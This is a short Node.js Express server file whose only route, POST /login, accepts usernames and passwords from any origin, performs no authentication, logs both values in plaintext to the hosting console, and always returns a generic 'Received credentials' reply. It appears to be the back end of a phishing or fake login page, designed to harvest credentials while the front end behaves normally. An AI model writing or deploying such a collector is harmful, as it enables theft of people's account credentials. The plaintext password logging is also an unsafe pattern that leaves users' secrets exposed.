const express = require("express");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

// Login Route (Just Logs Credentials)
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    // Log username & password in Render console
    console.log(`Login Attempt: Username - ${username}, Password - ${password}`);

    // Always send a generic response (doesn't affect frontend behavior)
    res.json({ message: "Received credentials" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
